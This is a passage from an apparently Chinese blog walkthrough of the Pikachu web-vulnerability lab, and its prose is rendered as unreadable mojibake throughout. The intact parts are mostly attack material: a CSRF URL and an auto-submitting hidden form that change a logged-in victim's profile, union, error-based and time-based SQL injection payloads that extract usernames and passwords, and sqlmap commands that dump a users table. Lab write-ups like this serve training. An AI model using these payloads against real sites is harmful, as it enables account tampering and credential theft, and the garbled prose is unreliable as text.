æ­¤ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œ(å¢åˆ æ”¹)æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ ã€‚<br>2.å°ç™½ç‚¹å‡»äº†å°é»‘å‘ç»™çš„é“¾æ¥ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶å€™å°ç™½åˆšå¥½ç™»å½•åœ¨è´­ç‰©ç½‘ä¸Š;<br>â€”å¦‚æœå°ç™½å®‰å…¨æ„è¯†é«˜ï¼Œä¸ç‚¹å‡»ä¸æ˜é“¾æ¥ï¼Œåˆ™æ”»å‡»ä¸ä¼šæˆåŠŸï¼Œåˆæˆ–è€…å³ä½¿å°ç™½ç‚¹å‡»äº†é“¾æ¥ï¼Œä½†å°ç™½æ­¤æ—¶å¹¶æ²¡æœ‰ç™»å½•è´­ç‰©ç½‘ç«™ï¼Œä¹Ÿä¸ä¼šæˆåŠŸã€‚<br>â€”å› æ­¤ï¼Œè¦æˆåŠŸå®æ–½ä¸€æ¬¡CSRFæ”»å‡»ï¼Œéœ€è¦â€œå¤©æ—¶ï¼Œåœ°åˆ©ï¼Œäººå’Œâ€çš„æ¡ä»¶ã€‚<br>å½“ç„¶ï¼Œå¦‚æœå°é»‘äº‹å…ˆåœ¨xxxç½‘çš„é¦–é¡µå¦‚æœå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´ï¼Œåˆ™å°é»‘å¯èƒ½ä¼šè¿™æ ·åšï¼š æ¬ºéª—å°ç™½è®¿é—®åŸ‹ä¼äº†XSSè„šæœ¬ï¼ˆç›—å–cookieçš„è„šæœ¬ï¼‰çš„é¡µé¢ï¼Œå°ç™½ä¸­æ‹›ï¼Œå°é»‘æ‹¿åˆ°å°ç™½çš„cookieï¼Œç„¶åå°é»‘é¡ºåˆ©ç™»å½•åˆ°å°ç™½çš„åå°ï¼Œå°é»‘è‡ªå·±ä¿®æ”¹å°ç™½çš„ç›¸å…³ä¿¡æ¯ã€‚<br>â€”æ‰€ä»¥è·Ÿä¸Šé¢æ¯”ä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹å‡ºCSRFä¸XSSçš„åŒºåˆ«ï¼šCSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚</p><p>å› æ­¤ï¼Œç½‘ç«™å¦‚æœè¦é˜²æ­¢CSRFæ”»å‡»ï¼Œåˆ™éœ€è¦å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å¯¹åº”çš„å®‰å…¨æªæ–½ï¼Œé˜²æ­¢è¿™äº›æ“ä½œå‡ºç°è¢«ä¼ªé€ çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´CSRFã€‚æ¯”å¦‚ï¼š<br><strong>â€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„tokenï¼›</strong><br><strong>â€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„éªŒè¯ç ï¼›</strong><br><strong>â€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å®‰å…¨çš„é€»è¾‘æµç¨‹ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç æ—¶ï¼Œéœ€è¦å…ˆæ ¡éªŒæ—§å¯†ç ç­‰ã€‚</strong></p></blockquote><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>å…ˆç™»å½•è¿›å»</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211093728691.png"></p><p>ä¿®æ”¹æäº¤çš„æ—¶å€™æŠ“åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211094138876.png"></p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=111111&amp;add=CHINA&amp;email=lucy%40qq.com&amp;submit=submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®URLç„¶åå‘ç»™åˆ«äººï¼Œåªè¦ä»–åœ¨ç™»å½•çŠ¶æ€ä¸‹ç‚¹äº†è¿™ä¸ªé“¾æ¥ï¼Œä»–çš„ä¿¡æ¯å°±è¢«ä¿®æ”¹äº†</p><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>è¿˜æ˜¯ä¸€æ ·ç™»å½•ï¼Œä¿®æ”¹ä¿¡æ¯ï¼ŒæŠ“åŒ…ã€‚ä½†è¿™æ¬¡ä¿®æ”¹ä¿¡æ¯æ˜¯åœ¨ä¸€ä¸ªPOSTè¡¨å•é‡Œ,ä¸èƒ½ç›´æ¥æ”¹URLäº†</p><p>æŸ¥äº†ä¸€ä¸‹å‘ç°ä¸€èˆ¬å¯ä»¥è‡ªå·±æ­ä¸€ä¸ªç«™ç‚¹ï¼Œç„¶åå°†POSTè¯·æ±‚éšè—åœ¨ç«™ç‚¹çš„è¡¨å•é‡Œï¼Œå½“ç”¨æˆ·ç‚¹å‡»åæ•°æ®å°±è¢«POSTåˆ°æœ‰CSRFæ¼æ´çš„ç½‘ç«™</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456789<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>usa<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vince@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªæ„é€ çš„ç½‘é¡µä¹Ÿå¯ä»¥ç”¨CSRFTesteræŠ“åŒ…æ¥ç”Ÿæˆ</p><p>æŠŠè¿™ä¸ªå­˜ä¸ºä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œæ”¾åˆ°ç½‘ç«™ç›®å½•ä¸‹ï¼Œå¦‚æœæœ‰äººåœ¨ç™»å½•çŠ¶æ€ä¸‹ç‚¹è¿›äº†è¿™ä¸ªç½‘é¡µå¹¶æäº¤äº†ï¼Œä»–çš„ä¿¡æ¯å°±ä¼šè¢«æ”¹æˆæˆ‘ä»¬äº‹å…ˆå‡†å¤‡å¥½çš„</p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h3><p>æŠ“åŒ…çš„æ—¶å€™å‘ç°å’Œå‰é¢çš„æ¯”è¾ƒï¼Œå¤šäº†ä¸€ä¸ªä»¤ç‰Œã€‚æ¯æ¬¡è¯·æ±‚æ—¶éƒ½å¢åŠ ä¸€ä¸ªä¸å®¹æ˜“ä¼ªé€ çš„éšæœºå­—ç¬¦ä¸²ï¼Œåå°å†å¯¹ä»¤ç‰Œè¿›è¡Œæ ¡éªŒ</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214100609125.png"></p><p>ç”±äºtokenæ˜¯éšæœºçš„ï¼Œæ‰€ä»¥ä¼ªé€ ä¸äº†äº†</p><h2 id="SQL-Injectï¼ˆSQLæ³¨å…¥ï¼‰"><a href="#SQL-Injectï¼ˆSQLæ³¨å…¥ï¼‰" class="headerlink" title="SQL-Injectï¼ˆSQLæ³¨å…¥ï¼‰"></a>SQL-Injectï¼ˆSQLæ³¨å…¥ï¼‰</h2><blockquote><p>SQLæ³¨å…¥æ¼æ´ä¸»è¦å½¢æˆçš„åŸå› æ˜¯åœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œå¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­åï¼Œè¢«å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œã€‚ ä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±è£¤ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰ã€‚</p><p>åœ¨æ„å»ºä»£ç æ—¶ï¼Œä¸€èˆ¬ä¼šä»å¦‚ä¸‹å‡ ä¸ªæ–¹é¢çš„ç­–ç•¥æ¥é˜²æ­¢SQLæ³¨å…¥æ¼æ´ï¼š<br>1.å¯¹ä¼ è¿›SQLè¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å±é™©å­—ç¬¦ä¼ å…¥ï¼›<br>2.ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ï¼›<br>3.è¿˜æœ‰å°±æ˜¯,ç›®å‰æœ‰å¾ˆå¤šORMæ¡†æ¶ä¼šè‡ªåŠ¨ä½¿ç”¨å‚æ•°åŒ–è§£å†³æ³¨å…¥é—®é¢˜,ä½†å…¶ä¹Ÿæä¾›äº†â€æ‹¼æ¥â€çš„æ–¹å¼,æ‰€ä»¥ä½¿ç”¨æ—¶éœ€è¦æ…é‡!</p></blockquote><h3 id="æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰"><a href="#æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰" class="headerlink" title="æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰"></a>æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰</h3><p>æŠ“åŒ…é‡å‘ï¼Œ</p><p>åŠ ä¸ª<code>â€˜</code>åˆ¤æ–­æ³¨å…¥ç±»åˆ«</p><p>åˆ¤æ–­å­—æ®µæ•°</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214154622070.png"></p><p>ä¸‹é¢å°±ä¸ä¸€ä¸€æ”¾å›¾äº†</p><p>payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span> <span class="token comment">#å­—æ®µæ•°ä¸º2</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment">#æŸ¥çœ‹æ˜¾ä½</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#çˆ†åº“ï¼ˆpikachuï¼‰</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#çˆ†è¡¨</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token comment">#çˆ†å­—æ®µ</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">#çˆ†å€¼</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214160143419.png"></p><h3 id="å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰"><a href="#å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰"></a>å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰</h3><p>å¸¸è§„å¥—è·¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#1.åˆ¤æ–­æ³¨å…¥ç±»å‹</span><span class="token number">1</span><span class="token number">1</span><span class="token string">'#2.åˆ¤æ–­å­—æ®µæ•°1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment"># </span><span class="token comment">#3.æŸ¥çœ‹æ˜¾ä½</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2 # #4.çˆ†åº“-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># </span><span class="token comment">#5.çˆ†è¡¨</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() ##6.çˆ†å­—æ®µ-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token comment">#</span><span class="token comment">#7.çˆ†å€¼</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214180536040.png"></p><h3 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h3><blockquote><p>åˆ°è¿™é‡Œå˜é‡ç±»å‹æ‹¼æ¥ç±»å‹å¤šç§å¤šæ ·ï¼Œåªè¦æˆåŠŸæŠŠé—­åˆæ„é€ å‡ºæ¥å°±è¡Œ</p></blockquote><p>ç¬¬ä¸€æ¬¡é‡åˆ°æœç´¢å‹æ³¨å…¥</p><p>è¯­å¥æ ¼å¼</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token string">'%{$username}%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„é€ åˆæ³•è¯­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token operator">%</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214183952763.png"></p><h3 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="headerlink" title="xxå‹æ³¨å…¥"></a>xxå‹æ³¨å…¥</h3><p>æŸ¥çœ‹æºç </p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214184354419.png"></p><p>payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xx'<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="â€œinsert-updateâ€æ³¨å…¥"><a href="#â€œinsert-updateâ€æ³¨å…¥" class="headerlink" title="â€œinsert/updateâ€æ³¨å…¥"></a>â€œinsert/updateâ€æ³¨å…¥</h3><p>è¿›å…¥æ³¨å†Œé¡µé¢ï¼Œæ¨æµ‹åœ¨ç”¨æˆ·åæˆ–è€…å¯†ç é‚£å¯èƒ½å­˜åœ¨æ³¨å…¥æ¼æ´</p><p>éšä¾¿è¾“å…¥çœ‹çœ‹æŠ¥é”™</p><pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'),'','','','')' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯•äº†å‡ ç§å¸¸è§çš„ï¼Œå‘ç°æŠ¥é”™æ³¨å…¥å¯ä»¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Amy<span class="token string">' and updatexml(1,concat(0x7e,database()),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214185323297.png"></p><h3 id="â€œdeleteâ€æ³¨å…¥"><a href="#â€œdeleteâ€æ³¨å…¥" class="headerlink" title="â€œdeleteâ€æ³¨å…¥"></a>â€œdeleteâ€æ³¨å…¥</h3><p>éšä¾¿æ”¾ç‚¹ç•™è¨€è¿›å»ï¼Œæ ¹æ®é¢˜æ„</p><p>ç‚¹åˆ é™¤çš„æ—¶å€™æŠ“åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214190707576.png"></p><p>åº”è¯¥å°±æ˜¯åœ¨è¿™é‡Œæ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214190857537.png"></p><h3 id="â€œhttp-headerâ€æ³¨å…¥"><a href="#â€œhttp-headerâ€æ³¨å…¥" class="headerlink" title="â€œhttp headerâ€æ³¨å…¥"></a>â€œhttp headerâ€æ³¨å…¥</h3><p>ç™»å½•ä¹‹åå¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">ä½ çš„ipåœ°å€:127.0.0.1ä½ çš„user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0ä½ çš„http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8ä½ çš„ç«¯å£ï¼ˆæœ¬æ¬¡è¿æ¥ï¼‰:tcp2211<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼¼æ›¾ç›¸è¯†å•Š</p><p>è¿™ä¸ªå’Œsqli-labsåé¢é‚£å‡ ä¸ªç‹¬ç‰¹çš„æ³¨å…¥ç‚¹å·®ä¸å¤š</p><p>è¯•äº†ä¸‹<strong>User-Agentã€Acceptã€Cookie</strong>éƒ½å¯ä»¥æ³¨å…¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,database())) and '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç›²æ³¨-base-on-boolean"><a href="#ç›²æ³¨-base-on-boolean" class="headerlink" title="ç›²æ³¨(base on boolean)"></a>ç›²æ³¨(base on boolean)</h3><blockquote><p>å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨åªèƒ½ä¸€ä¸ªä¸€ä¸ªå»çŒœï¼Œåœ¨ä¸çŸ¥é“æ•°æ®åº“ä¿¡æ¯çš„æƒ…å†µä¸‹æ‰‹å·¥å»åšéå¸¸çš„æµªè´¹æ—¶é—´</p><p>è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨sqlmapæˆ–è€…å†™ç‚¹pyè„šæœ¬æ¥åš</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"</span> -D pikachu -T <span class="token function">users</span> -C username,password --dump --batch --threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214195143311.png"></p><h3 id="ç›²æ³¨-base-on-time"><a href="#ç›²æ³¨-base-on-time" class="headerlink" title="ç›²æ³¨(base on time)"></a>ç›²æ³¨(base on time)</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#æ—¶é—´ç›²æ³¨</span>kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214192508708.png"></p><p>ç›´æ¥ä¸Šsqlmap</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2#"</span> --technique T -D pikachu -T <span class="token function">users</span> -C username,password --dump --batch --threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ‰ç‚¹å°æ…¢ï¼Œæ­£åœ¨ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çš„è¯•</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214195819281.png"></p><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><blockquote><ol><li>å­—ç¬¦ã€å­—ç¬¦é›†<br>å­—ç¬¦(character)æ˜¯ç»„æˆå­—ç¬¦é›†(character set)çš„åŸºæœ¬å•ä½ã€‚å¯¹å­—ç¬¦èµ‹äºˆä¸€ä¸ªæ•°å€¼(encoding)æ¥ç¡®å®šè¿™ä¸ªå­—ç¬¦åœ¨è¯¥å­—ç¬¦é›†ä¸­çš„ä½ç½®ã€‚</li><li>UTF8<br>ç”±äºASCIIè¡¨ç¤ºçš„å­—ç¬¦åªæœ‰128ä¸ªï¼Œå› æ­¤ç½‘ç»œä¸–ç•Œçš„è§„èŒƒæ˜¯ä½¿ç”¨UNICODEç¼–ç ï¼Œä½†æ˜¯ç”¨ASCIIè¡¨ç¤ºçš„å­—ç¬¦ä½¿ç”¨UNICODEå¹¶ä¸é«˜æ•ˆã€‚å› æ­¤å‡ºç°äº†ä¸­é—´æ ¼å¼å­—ç¬¦é›†ï¼Œè¢«ç§°ä¸ºé€šç”¨è½¬æ¢æ ¼å¼ï¼ŒåŠUTF(Universal Transformation 